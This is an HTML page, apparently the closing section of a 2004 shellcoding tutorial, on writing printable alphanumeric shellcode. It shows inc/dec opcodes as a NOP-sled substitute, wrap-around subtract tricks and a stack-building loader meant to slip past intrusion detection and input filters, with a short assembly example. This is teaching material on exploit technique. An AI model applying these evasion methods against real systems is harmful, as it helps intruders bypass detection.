<p><font face="Courier New">&nbsp;&nbsp;&nbsp; 
	This section covers some more advanced topics in shellcoding. Over time
 I hope to add quite a bit more content here but for the time being
I am very busy. If you have any specific requests for topics in this 
section, please do not hesitate to email me.
</font>
</p>

<h4><font face="Courier New"><a name="ps">Printable Shellcode</a></font></h4><font face="Courier New">
<p>
	&nbsp;&nbsp;&nbsp;The basis for this section is the fact that many 
Intrustion Detection Systems detect shellcode because of the 
non-printable characters
	that are common to all binary data. The IDS observes that a packet 
containts some binary data (with for instance a NOP sled within
	this binary data) and as a result may drop the packet. In addition to 
this, many programs filter input unless it is alpha-numeric. 
	The motivation behind printable alpha-numeric shellcode should be quite
 obvious. By increasing the size of our shellcode we can implement
	a method in which our entire shellcode block in in printable 
characters. This section will differ a bit from the others presented in 
this
	paper. This section will simply demonstrate the tactic with small 
examples without an all encompassing final example. 
</p>
<p>
	&nbsp;&nbsp;&nbsp;Our first discussion starts with obfuscating the ever
 blatant NOP sled. When an IDS sees an arbitrarily long string of NOPs 
(0x90)
	it will most likely drop the packet. To get around this we observe the 
decrement and increment op codes:
	</p><hr>
	<pre><font face="Courier New">
	<b><i>OP Code        Hex       ASCII</i></b>
	<b>inc eax</b>        0x40        @
	<b>inc ebx</b>        0x43        C
	<b>inc ecx</b>        0x41        A
	<b>inc edx</b>        0x42        B
	<b>dec eax</b>        0x48        H
	<b>dec ebx</b>        0x4B        K
	<b>dec ecx</b>        0x49        I
	<b>dec edx</b>        0x4A        J</font></pre>
	<hr>
	<br><br>
	It should be pretty obvious that if we insert these operations instead 
of a NOP sled then the code will not affect the output. This is due to 
the fact
	that whenever we use a register in our shellcode we wither move a value
 into it or we xor it. Incrementing or decrementing the register before 
our
	code executes will not change the desired operation.
<p></p>
<p>
	So, the next portion of this printable shellcode section will discuss a
 method for making one's entire block of shellcode alpha-numeric-- by 
means
	of some major tomfoolery. We must first discuss the few opcodes that 
fall in the printable ascii range (0x33 through 0x7e). 
	</p><hr>
	<pre>	sub eax, 0xHEXINRANGE
	push eax
	pop eax
	push esp
	pop esp
	and eax, 0xHEXINRANGE
	</pre>
	<hr>
<p></p>
<p>
	Surprisingly, we can actually do whatever we want with these 
instructions. I did my best to keep diagrams out of this talk, but I 
decided to grace
	the world with my wonderful ASCII art. Below you can find a diagram of 
the basic plan for constructing the shellcode.<br>
	</p><pre>	The plan works as follows:
		-make space on stack for shellcode and loader
		-execute loader code to construct shellcode
		-use a NOP bridge to ensure that there aren't any extraneous bytes that will crash our code.
		-profit
	</pre>
	But now I hear you clamoring that we can't use move nor can we subtract
 from esp because they don't fall into printable characters!!! Settle 
down, have
	I got a solution for you! We will use subtract to place values into 
EAX, push the value to the stack, then pop it into ESP.<br><br>
	Now you're wondering why I said subtract to put values into EAX, the 
problem is we can't use add, and we can't directly assign nonprintable 
bytes.
	How can we overcome this? We can use the fact that each register has 
only 32 bits, so if we force a wrap around, we can arbitrarily assign 
values to a register
	using only printable characters with two to three subtract 
instructions.
	<br><br>
	If the gears in your head aren't cranking yet, you should probably stop reading right now.
	<br>
	<hr>
	<pre>	The log awaited ASCII diagram
	1)
	EIP(loader code) --------ALLOCATED STACK SPACE--------ESP

	2)
	---(loader code)---EIP-------STACK------ESP--(shellcode--

	3)
	----loadercode---EIP@ESP----shellcode that was builts---
	</pre>
	<hr>
	<p>
	So, that diagram probably warrants some explanation. Basically, we take
 our already written shellcode, and generate two to three subtract 
instructions
	per four bytes and do the push EAX, pop ESP trick. This basically 
places the constructed shellcode at the end of the stack and works 
towards the EIP.
	So we construct 4 bytes at a time for the entirety of the code and then
 insert a small NOP bridge (indicated by @) between the builder code and
 the shellcode.
	The NOP bridge is used to word align the end of the builder code. 
	<br>
	<br>
	<i>Example code:</i>
	</p><pre><hr>
	and eax, 0x454e4f4a	;  example of how to zero out eax(unrelated)
	and eax, 0x3a313035
	
	
	push esp
	pop eax
	sub eax, 0x39393333	; construct 860 bytes of room on the stack
	sub eax, 0x72727550	
	sub eax, 0x54545421
	
	push eax		; save into esp
	pop esp
	<hr></pre>
	Oh, and I forgot to mention, the code must be inserted in reverse order
 and the bytes must adhere to the little endian standard.	
	That job sounds incredibly tedious, thank god that matrix <a href="http://www.phiral.com/research/dissembler_0.9.tgz">wrote a tool</a>
 that does it for us!
	The point is that now you can use this utility only once you understand
 the concepts presented above. Remember, if you don't understand it, 
you're just
	another script kiddie.

	<p></p>
<p></p>

</font>

<br>
<br>
<b><font size="5" face="Courier New"><a name="fr">Further Reading</a></font></b><p></p><p><font face="Courier New">Below
 is a list of great resources that relate to shellcoding. I suggest 
picking up a copy of all of the documents listed, but if that is an 
impossibility, at the very least get <u>The Shellcoder's Handbook</u>; it is a pure goldmine of information.</font></p><ul><li><font size="2" face="Courier New"><u>The Shellcoder's Handbook</u> by Jack Koziol et al</font></li><li><font size="2" face="Courier New"><u>Hacking - The Art of Exploitation</u> by Jon Erickson</font></li><li><font size="2" face="Courier New">"Understanding Windows Shellcode" by nologin.org</font></li></ul><p>&nbsp;</p><p><b><font size="5" face="Courier New"><a name="con">Conclusion</a></font></b></p><p><font size="5" face="Courier New"><b>&nbsp;&nbsp;&nbsp; </b></font><font face="Courier New">At
 this point the reader should be able to write at the very least basic 
shellcode to exploit applications on either the windows or linux 
platforms. The tricks demonstrated here will help a shellcoder 
understand other's shellcode and modify prewritten shellcode to fit the 
situation at hand. Shellcoding is always looked at as a minor detail of 
hacking a piece of software but invariably, a hack is only as strong 
enough as its weakest link. If the shellcode doesn't work, then the 
attempt at breaking the software fails; that is why it is important to 
understand all aspect of the process. Otherwise, good luck and have fun 
shellcoding!</font></p><p>&nbsp;</p><p align="center"><font size="2" face="Courier New">Copyright 2004 Steve Hanna</font></p>

<script src="http://www.google-analytics.com/urchin.js" type="text/javascript">
</script>
<script type="text/javascript">
_uacct = "UA-1562078-1";
urchinTracker();
</script>


</body></html>